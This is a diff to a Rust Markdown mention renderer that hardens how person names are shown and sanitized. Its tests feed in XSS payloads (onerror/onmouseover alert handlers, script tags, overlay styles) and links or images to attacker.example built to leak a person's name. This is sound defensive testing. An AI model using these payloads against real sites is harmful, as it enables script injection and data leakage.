@@ -1,195 +1,178 @@
 //! Mentions of people in rendered text (S9, #360; ONTOLOGY §7.3, §14).
 //!
-//! `common::mention` reads the `@[label](person:id)` syntax for the API;
-//! the API says who each mention may be named as (`MentionName`, which
-//! rides on the text's own answer). This module shows them.
+//! `common::mention` reads the `@[label](person:id)` syntax; the API
+//! says who each mention may be named as (`MentionName`, which rides on
+//! the text's own answer). This module shows them.
 //!
-//! **A mention is rendered only where Markdown reads a link.** The token
-//! is link syntax, so the Markdown parser finds it: an `@` followed by a
-//! link whose destination is `person:<id>`. It is replaced in the parsed
-//! events, never in the source. (Putting HTML into the source put the
-//! person's name wherever the token sat, a writer's own
-//! `<a href='https://elsewhere/?q=@[x](person:…)'>` included: the name
-//! then travelled to that address on a click. Found by the review of
-//! #361's second half.) In code, in an HTML block, in an attribute, a
-//! token is whatever Markdown makes of it there, and nobody is named.
+//! **A mention is shown only where both readers agree it is one.**
+//! [`with_mentions`] replaces a token among the parsed Markdown events
+//! when `common::mention::mentions` reads a token at that place in the
+//! source **and** the Markdown parser read the same place as an inline
+//! link, outside an image and outside a link the writer wrote in HTML.
+//! Anywhere else (code, an HTML block, an attribute, an image's alt
+//! text) the token is whatever Markdown makes of it, and nobody is named.
 //!
-//! **The mention's HTML is put in after the sanitizer has run.** Where a
-//! mention goes, the events carry a marker (two private-use characters
-//! around a number), which the sanitizer passes as text;
-//! [`Mentions::fill_html`] then puts the HTML there. So the sanitizer
-//! allows none of the mention's classes, and a writer can't dress their
-//! own link up as a mention.
+//! Two designs that were tried and must not come back (both from the
+//! reviews of #362):
+//! - **HTML put into the Markdown source** before parsing put the
+//!   person's name wherever the token sat, a writer's own
+//!   `<a href='https://elsewhere/?q=…'>` included: the name travelled to
+//!   that address on a click.
+//! - **HTML put in after the sanitizer** (at markers left in the text)
+//!   let a writer forge a marker and have the fill cut through the
+//!   sanitized markup: attributes of their choosing on an allowed
+//!   element, past the sanitizer.
+//!
+//! So: the mention is written **as events, before the HTML is written,
+//! and the sanitizer runs last, on everything**. The name is a `Text`
+//! event, which the HTML writer escapes; the tags around it are fixed
+//! strings with a canonical id. The sanitizer allows the two classes by
+//! name. A writer can therefore give words of their own the plain look
+//! of a name (as they can make them bold); the link's look is styled
+//! only for a link to `/people/…` (`input.css`).
 
-use std::borrow::Cow;
+use std::collections::HashMap;
+use std::ops::Range;
 
-use common::mention::{MentionName, html_inert, person_of_link};
+use common::id::PersonId;
+use common::mention::{MentionName, mentions};
 use pulldown_cmark::{CowStr, Event, LinkType, Tag, TagEnd};
 
-/// Around a mention's number in the events and the sanitized HTML.
-/// Private-use characters: they mean nothing in text, and
-/// [`without_markers`] takes them out of what a writer wrote.
-const OPEN: char = '\u{e000}';
-const CLOSE: char = '\u{e001}';
+/// The three events one mention becomes: an opening tag, its words, a
+/// closing tag.
+///
+/// - The reader's own person: a link to their page, with their current
+///   name.
+/// - Someone else's person the reader may be told of: the current name
+///   as plain text. No link, and no id in the markup: there is no way
+///   into another account's People (§14).
+/// - Anyone else (no such person, not really mentioned here, or their
+///   owner can no longer open the node): the label as it was typed,
+///   marked unresolved, in words too (`title`).
+fn shown<'a>(person: PersonId, label: &str, people: &[MentionName]) -> [Event<'a>; 3] {
+    let (open, words, close) = match people.iter().find(|p| p.person_id == person) {
+        Some(named) if named.mine => (
+            format!(
+                r#"<a class="mention" href="/people/{}">"#,
+                named.person_id.0.hyphenated()
+            ),
+            format!("@{}", named.display_name),
+            "</a>",
+        ),
+        Some(named) => (
+            r#"<span class="mention">"#.to_string(),
+            format!("@{}", named.display_name),
+            "</span>",
+        ),
+        None => (
+            r#"<span class="mention-unresolved" title="Not linked to a person">"#.to_string(),
+            format!("@{}", label.trim()),
+            "</span>",
+        ),
+    };
+    [
+        Event::InlineHtml(CowStr::from(open)),
+        // A `Text` event: the HTML writer escapes it. Never put a name
+        // into the tag strings.
+        Event::Text(CowStr::from(words)),
+        Event::InlineHtml(CowStr::from(close)),
+    ]
+}
 
-/// `source` without the two marker characters, so the only markers in a
-/// rendering are the ones [`Mentions::mark`] put there.
-pub fn without_markers(source: &str) -> Cow<'_, str> {
-    if source.contains([OPEN, CLOSE]) {
-        Cow::Owned(source.replace([OPEN, CLOSE], ""))
-    } else {
-        Cow::Borrowed(source)
+/// How many `<a …>` a piece of the writer's own HTML opens, less how
+/// many `</a>` it closes. A token between the two is the text of the
+/// writer's link: resolving it would put a person's name, styled as a
+/// mention, on a link to the writer's address.
+///
+/// This is tidiness, not a boundary. It reads tags by eye (a `</a>`
+/// inside an attribute fools it), and what it prevents tells nothing:
+/// the name would be words on the page, shown to a reader who may know
+/// it, and never part of the address.
+fn anchors_opened(html: &str) -> i32 {
+    let lower = html.to_ascii_lowercase();
+    let mut opened = 0;
+    let mut rest = lower.as_str();
+    while let Some(at) = rest.find('<') {
+        let tag = rest.get(at + 1..).unwrap_or_default();
+        if let Some(after) = tag.strip_prefix("/a") {
+            if after.starts_with(|c: char| c == '>' || c.is_whitespace()) || after.is_empty() {
+                opened -= 1;
+            }
+        } else if let Some(after) = tag.strip_prefix('a')
+            && (after.starts_with(|c: char| c == '>' || c == '/' || c.is_whitespace())
+                || after.is_empty())
+        {
+            opened += 1;
+        }
+        rest = tag;
     }
+    opened
 }
 
-/// One mention as it is shown: as HTML, and as plain words (an outline).
-struct Shown {
-    html: String,
-    plain: String,
-}
-
-impl Shown {
-    /// - The reader's own person: a link to their page, with their
-    ///   current name.
-    /// - Someone else's person the reader may be told of: the current
-    ///   name as plain text. No link, and no id in the markup: there is
-    ///   no way into another account's People (§14).
-    /// - Anyone else (no such person, not really mentioned here, or
-    ///   their owner can no longer open the node): the label as it was
-    ///   typed, marked unresolved.
-    ///
-    /// SECURITY: this HTML is not sanitized afterwards, so everything in
-    /// it is written here: fixed tags, a canonical id, and the name with
-    /// every character that is not a letter or a digit as a numeric
-    /// entity (`html_inert`).
-    fn of(person: common::id::PersonId, label: &str, people: &[MentionName]) -> Self {
-        match people.iter().find(|p| p.person_id == person) {
-            Some(named) if named.mine => {
-                let plain = format!("@{}", named.display_name);
-                Self {
-                    html: format!(
-                        r#"<a class="mention" href="/people/{}">{}</a>"#,
-                        named.person_id.0.hyphenated(),
-                        html_inert(&plain),
-                    ),
-                    plain,
-                }
+/// `events` (parsed from `source`, with where each came from) with every
+/// mention replaced by what `people` lets its reader see.
+pub fn with_mentions<'a>(
+    source: &str,
+    events: Vec<(Event<'a>, Range<usize>)>,
+    people: &[MentionName],
+) -> Vec<Event<'a>> {
+    // Where the one scanner reads a token: its start (the `@`) to its
+    // end, and whose it is.
+    let tokens: HashMap<usize, (usize, PersonId, String)> = mentions(source)
+        .into_iter()
+        .map(|m| {
+            (
+                m.range.start,
+                (m.range.end, m.person_id, m.label.to_string()),
+            )
+        })
+        .collect();
+    let mut out: Vec<Event<'a>> = Vec::with_capacity(events.len());
+    let mut in_image = 0usize;
+    let mut in_anchor = 0i32;
+    let mut events = events.into_iter();
+    while let Some((event, range)) = events.next() {
+        match &event {
+            Event::Start(Tag::Image { .. }) => in_image += 1,
+            Event::End(TagEnd::Image) => in_image = in_image.saturating_sub(1),
+            Event::InlineHtml(html) | Event::Html(html) => {
+                in_anchor = (in_anchor + anchors_opened(html)).max(0);
             }
-            Some(named) => {
-                let plain = format!("@{}", named.display_name);
-                Self {
-                    html: format!(r#"<span class="mention">{}</span>"#, html_inert(&plain)),
-                    plain,
-                }
-            }
-            None => {
-                let plain = format!("@{}", label.trim());
-                Self {
-                    // Said in words too: not everyone sees the colour.
-                    html: format!(
-                        r#"<span class="mention-unresolved" title="Not linked to a person">{}</span>"#,
-                        html_inert(&plain)
-                    ),
-                    plain,
-                }
+            _ => {}
+        }
+        let token = match &event {
+            Event::Start(Tag::Link {
+                link_type: LinkType::Inline,
+                ..
+            }) if in_image == 0 && in_anchor == 0 => range
+                .start
+                .checked_sub(1)
+                .and_then(|at| tokens.get(&at))
+                .filter(|(end, _, _)| *end == range.end),
+            _ => None,
+        };
+        let after_at = matches!(out.last(), Some(Event::Text(text)) if text.ends_with('@'));
+        let Some((_, person, label)) = token.filter(|_| after_at) else {
+            out.push(event);
+            continue;
+        };
+        // The link's own events are the label, which the scanner has
+        // already read.
+        for (inner, _) in events.by_ref() {
+            if matches!(inner, Event::End(TagEnd::Link)) {
+                break;
             }
         }
-    }
-}
-
-/// The mentions of one rendering, in order.
-pub struct Mentions {
-    shown: Vec<Shown>,
-}
-
-impl Mentions {
-    /// `events` with each mention replaced by a marker, and what to put
-    /// at each marker.
-    ///
-    /// A mention is an inline link to `person:<id>` (the one spelling
-    /// `common::mention` reads) that directly follows an `@`. Anything
-    /// else is left as it is: a link to `person:…` without the `@` is an
-    /// ordinary link, whose destination the sanitizer drops.
-    pub fn mark<'a>(events: Vec<Event<'a>>, people: &[MentionName]) -> (Vec<Event<'a>>, Self) {
-        let mut out: Vec<Event<'a>> = Vec::with_capacity(events.len());
-        let mut shown = Vec::new();
-        let mut events = events.into_iter().peekable();
-        while let Some(event) = events.next() {
-            let person = match &event {
-                Event::Start(Tag::Link {
-                    link_type: LinkType::Inline,
-                    dest_url,
-                    ..
-                }) => person_of_link(dest_url),
-                _ => None,
-            };
-            let after_at = matches!(out.last(), Some(Event::Text(text)) if text.ends_with('@'));
-            let Some(person) = person.filter(|_| after_at) else {
-                out.push(event);
-                continue;
-            };
-            // The link's text is the label; whatever Markdown made of it
-            // (emphasis, code) counts as its words.
-            let mut label = String::new();
-            for inner in events.by_ref() {
-                match inner {
-                    Event::End(TagEnd::Link) => break,
-                    Event::Text(text) | Event::Code(text) => label.push_str(&text),
-                    Event::SoftBreak | Event::HardBreak => label.push(' '),
-                    _ => {}
-                }
+        // The `@` belongs to the mention.
+        if let Some(Event::Text(text)) = out.pop() {
+            let before = text.strip_suffix('@').unwrap_or(&text);
+            if !before.is_empty() {
+                out.push(Event::Text(CowStr::from(before.to_string())));
             }
-            // The `@` belongs to the mention.
-            if let Some(Event::Text(text)) = out.pop() {
-                let before = text.strip_suffix('@').unwrap_or(&text);
-                if !before.is_empty() {
-                    out.push(Event::Text(CowStr::from(before.to_string())));
-                }
-            }
-            out.push(Event::Text(CowStr::from(format!(
-                "{OPEN}{}{CLOSE}",
-                shown.len()
-            ))));
-            shown.push(Shown::of(person, &label, people));
         }
-        (out, Self { shown })
+        out.extend(shown(*person, label, people));
     }
-
-    fn fill(&self, text: &str, pick: impl Fn(&Shown) -> &str) -> String {
-        let mut out = String::with_capacity(text.len());
-        let mut rest = text;
-        while let Some(open) = rest.find(OPEN) {
-            out.push_str(rest.get(..open).unwrap_or_default());
-            let after = rest.get(open + OPEN.len_utf8()..).unwrap_or_default();
-            let Some(close) = after.find(CLOSE) else {
-                rest = after;
-                continue;
-            };
-            // A marker that is not one of ours can't be here
-            // (`without_markers`); if it were, it is dropped.
-            if let Some(shown) = after
-                .get(..close)
-                .and_then(|n| n.parse::<usize>().ok())
-                .and_then(|n| self.shown.get(n))
-            {
-                out.push_str(pick(shown));
-            }
-            rest = after.get(close + CLOSE.len_utf8()..).unwrap_or_default();
-        }
-        out.push_str(rest);
-        out
-    }
-
-    /// The sanitized HTML with each marker replaced by its mention.
-    pub fn fill_html(&self, sanitized: &str) -> String {
-        self.fill(sanitized, |shown| &shown.html)
-    }
-
-    /// Plain words (a heading's outline entry) with each marker replaced
-    /// by "@name".
-    pub fn fill_plain(&self, text: &str) -> String {
-        self.fill(text, |shown| &shown.plain)
-    }
+    out
 }
 
 #[cfg(test)]
@@ -212,11 +195,13 @@ mod tests {
         }]
     }
 
-    fn link() -> String {
-        format!(
-            r#"<a class="mention" href="/people/{}">"#,
-            ada().0.hyphenated()
-        )
+    /// Every way a text is rendered with names.
+    fn renderings(text: &str, people: &[MentionName]) -> [String; 3] {
+        [
+            render_note(text, people),
+            render_markdown(text, &HashMap::new(), people),
+            render_body(text, &HashMap::new(), people).html,
+        ]
     }
 
     #[test]
@@ -225,12 +210,15 @@ mod tests {
         // The current name, not the label.
         let own = render_note(&text, &named("Ada King", true));
         assert!(
-            own.contains(&format!("Met {}&#64;Ada&#32;King</a>.", link())),
+            own.contains(&format!(
+                r#"Met <a class="mention" href="/people/{}""#,
+                ada().0.hyphenated()
+            )) && own.contains(">@Ada King</a>."),
             "{own}"
         );
         let others = render_note(&text, &named("Ada King", false));
         assert!(
-            others.contains(r#"Met <span class="mention">&#64;Ada&#32;King</span>."#),
+            others.contains(r#"Met <span class="mention">@Ada King</span>."#),
             "{others}"
         );
         // SECURITY: nothing of the person but the name for another reader.
@@ -239,7 +227,7 @@ mod tests {
         let nobody = render_note(&text, &[]);
         assert!(
             nobody.contains(
-                r#"<span class="mention-unresolved" title="Not linked to a person">&#64;Ada</span>"#
+                r#"<span class="mention-unresolved" title="Not linked to a person">@Ada</span>"#
             ),
             "{nobody}"
         );
@@ -249,36 +237,46 @@ mod tests {
     #[test]
     fn a_name_is_never_markdown_or_markup() {
         let text = mention_token("x", ada());
-        let hostile = "[click](https://evil.example) *b* <img src=x onerror=1> `c` \"q\" 'q' &amp;";
+        let hostile = "[click](https://evil.example) *b* <img src=x onerror=alert(1)> `c` \"q\" 'q' &amp; </a></span><script>x</script>";
         for people in [named(hostile, true), named(hostile, false)] {
-            let html = render_note(&text, &people);
-            assert!(!html.contains("<img") && !html.contains("<em>"), "{html}");
-            assert!(
-                !html.contains("<code>") && !html.contains("onerror=1>"),
-                "{html}"
-            );
-            assert_eq!(
-                html.matches("href=").count(),
-                usize::from(people[0].mine),
-                "{html}"
-            );
-            assert!(html.contains("evil"), "the name is still shown: {html}");
+            for html in renderings(&text, &people) {
+                assert!(!html.contains("<img") && !html.contains("<em>"), "{html}");
+                assert!(
+                    !html.contains("<code>") && !html.contains("<script"),
+                    "{html}"
+                );
+                // One link at most (the owner's), and it goes to the person.
+                assert_eq!(
+                    html.matches("href=").count(),
+                    usize::from(people[0].mine),
+                    "{html}"
+                );
+                assert!(!html.contains("href=\"https://evil"), "{html}");
+                assert!(
+                    html.contains("evil.example"),
+                    "the name is still shown: {html}"
+                );
+            }
         }
         // A label too (it is the writer's own text, and still inert).
         let token = format!("@[<b>*x*</b> y](person:{})", ada().0.hyphenated());
-        let html = render_note(&token, &[]);
-        assert!(!html.contains("<b>") && !html.contains("<em>"), "{html}");
+        for html in renderings(&token, &[]) {
+            assert!(!html.contains("<b>") && !html.contains("<em>"), "{html}");
+        }
     }
 
-    /// SECURITY (from the review): a name goes only where Markdown reads
-    /// a link. In a writer's own attribute it would travel to the
-    /// writer's address on a click, or at once in an image's address.
+    /// SECURITY (from the reviews of #362): a name goes only into the
+    /// words of the page. Not into a writer's own link address or
+    /// attribute (it would travel to the writer's address on a click),
+    /// not into an image's alt text, and not onto a link of the writer's.
     #[test]
-    fn a_name_never_lands_in_a_writers_attribute_or_in_code() {
+    fn a_name_never_lands_in_an_attribute_in_code_or_on_a_writers_link() {
         let token = mention_token("x", ada());
         let secret = "Ada Secret";
         for text in [
             format!("<a href='https://attacker.example/?q={token}'>Quarterly report</a>"),
+            format!("<a href=\"https://attacker.example/\">{token}</a>"),
+            format!("<A HREF=\"https://attacker.example/\">see {token} here</A>"),
             format!("<img src='https://attacker.example/?{token}'>"),
             format!("<span title=\"{token}\">hover</span>"),
             format!("<!-- {token} -->"),
@@ -287,52 +285,68 @@ mod tests {
             format!("    {token}"),
             format!("```\n{token}\n```"),
             format!("[a link]({token})"),
+            format!("[a link](https://attacker.example/ \"{token}\")"),
+            format!("![{token}](https://attacker.example/i.png)"),
             format!("![alt](https://attacker.example/{token})"),
         ] {
             for people in [named(secret, true), named(secret, false)] {
-                for html in [
-                    render_note(&text, &people),
-                    render_markdown(&text, &HashMap::new(), &people),
-                    render_body(&text, &HashMap::new(), &people).html,
-                ] {
+                for html in renderings(&text, &people) {
                     assert!(!html.contains("Secret"), "{text} -> {html}");
-                    assert!(!html.contains("&#83;ecret"), "{text} -> {html}");
                 }
             }
         }
-    }
-
-    /// A writer can't make their own link look like a mention: the
-    /// mention's classes are not among those the sanitizer lets through.
-    #[test]
-    fn nobody_can_forge_the_look_of_a_mention() {
-        let forged = render_note(
-            r#"<a class="mention fixed inset-0" href="https://attacker.example/">@Ada King</a> <span class="mention etl-root">y</span> <span class="mention-unresolved">z</span>"#,
-            &named("Ada King", true),
-        );
-        // The sanitizer empties the attribute; no class of any kind is left.
-        for class in ["mention", "fixed", "inset-0", "etl-root"] {
-            assert!(!forged.contains(class), "{class}: {forged}");
+        // Markdown does not nest links: the token is the link, and the
+        // writer's address around it is words on the page. The name is
+        // linked to the person, never to that address.
+        let nested = format!("[{token}](https://attacker.example/)");
+        for html in renderings(&nested, &named(secret, true)) {
+            assert!(html.contains("@Ada Secret</a>"), "{html}");
+            assert_eq!(html.matches("href=").count(), 1, "{html}");
+            assert!(html.contains("href=\"/people/"), "{html}");
         }
-        // Nor fake a marker of their own.
-        let fake = render_note(
-            "\u{e000}0\u{e001} and \u{e000}7\u{e001}",
-            &named("Ada", true),
-        );
-        assert!(!fake.contains("mention") && !fake.contains("Ada"), "{fake}");
-        let with_real = render_note(
-            &format!("\u{e000}0\u{e001} {}", mention_token("Ada", ada())),
-            &named("Ada", true),
-        );
-        assert_eq!(
-            with_real.matches("class=\"mention\"").count(),
-            1,
-            "{with_real}"
-        );
+    }
+
+    /// The sanitizer is the last thing that touches the HTML, whatever
+    /// the text holds. These broke out of it while the mention's HTML
+    /// was put in afterwards, at markers a writer could forge.
+    #[test]
+    fn nothing_a_writer_types_gets_past_the_sanitizer() {
+        let token = mention_token("x", ada());
+        let forged = [
+            "<a href=\"https://attacker.example/\" title=\"&#xE000;\">Sign in again</a>&#xE001;<span title=\" class=etl-root style=position:fixed;inset:0 onmouseover=alert(1) x=\">.</span><span title=\"y\">.</span>".to_string(),
+            "[Sign in again](https://attacker.example/ \"&#xE000;\")&#57345;<span title=\" onmouseover=alert(1) class=etl-root x=\">.</span>".to_string(),
+            format!("\u{e000}0\u{e001} &#xE000;0&#xE001; {token}"),
+            format!("![{token} <img src=x onerror=alert(1)>](https://e.example/i.png)"),
+            format!("<span title=\"\u{e000}0\u{e001}\">{token}</span>"),
+        ];
+        for text in &forged {
+            for people in [named("Ada", true), named("Ada", false), Vec::new()] {
+                for html in renderings(text, &people) {
+                    // Cleaned again, it is what it was: nothing in it is
+                    // something the sanitizer would have taken out.
+                    assert_eq!(crate::markdown::sanitized(&html), html, "{text} -> {html}");
+                    assert!(
+                        !html.contains("onmouseover=") || html.contains("title=\""),
+                        "{html}"
+                    );
+                    for class in ["etl-root", "fixed"] {
+                        assert!(!html.contains(&format!("class=\"{class}")), "{html}");
+                    }
+                }
+            }
+        }
+        // And an event handler never becomes an attribute.
+        let html = render_note(&forged[0], &[]);
+        let doc = ammonia::Builder::new()
+            .add_generic_attributes(&["onmouseover", "class", "style"])
+            .clean(&html)
+            .to_string();
+        assert!(!doc.contains(" onmouseover=\""), "{doc}");
+        assert!(!doc.contains(" class=\"etl-root\""), "{doc}");
     }
 
     #[test]
-    fn only_an_at_sign_and_a_person_link_together_are_a_mention() {
+    fn only_what_both_readers_call_a_mention_is_one() {
         let id = ada().0.hyphenated().to_string();
         let people = named("Ada", true);
         for not_one in [
@@ -343,11 +357,22 @@ mod tests {
             format!("@[Ada](https://example.com/person:{id})"),
             format!("@[Ada][ref]\n\n[ref]: person:{id}"),
             format!("@<person:{id}>"),
+            // Forms Markdown reads as a link to the person, and the one
+            // scanner does not read as a token.
+            format!("&#64;[Ada](person:{id})"),
+            format!("@[Ada](person:{id} \"a title\")"),
+            format!("@[Ada](<person:{id}>)"),
+            format!("@[](person:{id})"),
+            format!("@[A [nested] da](person:{id})"),
+            // Markdown reads `\]` as part of a longer link: its link ends
+            // elsewhere than a token would.
+            format!("@[A\\](person:{id})](person:{id})"),
         ] {
-            let html = render_note(&not_one, &people);
-            assert!(!html.contains("class=\"mention"), "{not_one} -> {html}");
-            // And a link to `person:` is dropped by the sanitizer.
-            assert!(!html.contains("href=\"person:"), "{not_one} -> {html}");
+            for html in renderings(&not_one, &people) {
+                assert!(!html.contains("class=\"mention"), "{not_one} -> {html}");
+                // And a link to `person:` is dropped by the sanitizer.
+                assert!(!html.contains("href=\"person:"), "{not_one} -> {html}");
+            }
         }
         // Several, and mixed with other things.
         let text = format!(
@@ -362,19 +387,18 @@ mod tests {
     fn wiki_links_and_mentions_live_side_by_side() {
         let node = NodeId(Uuid::from_u128(7));
         let titles: HashMap<String, NodeId> = [("plan".to_string(), node)].into();
-        let text = format!(
-            "[[Plan]] with {} and [[Nowhere]]",
-            mention_token("Ada", ada())
-        );
+        let token = mention_token("Ada", ada());
+        let text = format!("[[Plan]] with {token} and [[Nowhere]] and [[Plan|{token}]]");
         let html = render_markdown(&text, &titles, &named("Ada", true));
         assert!(
             html.contains(r#"<a class="wikilink" data-node-id="#),
             "{html}"
         );
+        // The one in the wiki link's own words is that link's text.
         assert_eq!(html.matches("class=\"mention\"").count(), 1, "{html}");
         assert!(html.contains(r#"<span class="wikilink-unresolved">Nowhere</span>"#));
         // In a note, wiki links are text and the mention is a mention.
-        let note = render_note(&text, &named("Ada", true));
+        let note = render_note(&format!("[[Plan]] with {token}"), &named("Ada", true));
         assert!(
             note.contains("[[Plan]] with <a class=\"mention\""),
             "{note}"
@@ -390,7 +414,6 @@ mod tests {
         let body = render_body(&text, &HashMap::new(), &named("Ada King", true));
         assert_eq!(body.outline[0].text, "Ask @Ada King");
         assert!(body.html.contains("class=\"mention\""), "{}", body.html);
-        assert!(!body.html.contains('\u{e000}'), "{}", body.html);
     }
 
     /// Where no names are at hand (a Brief, a template, a task title),
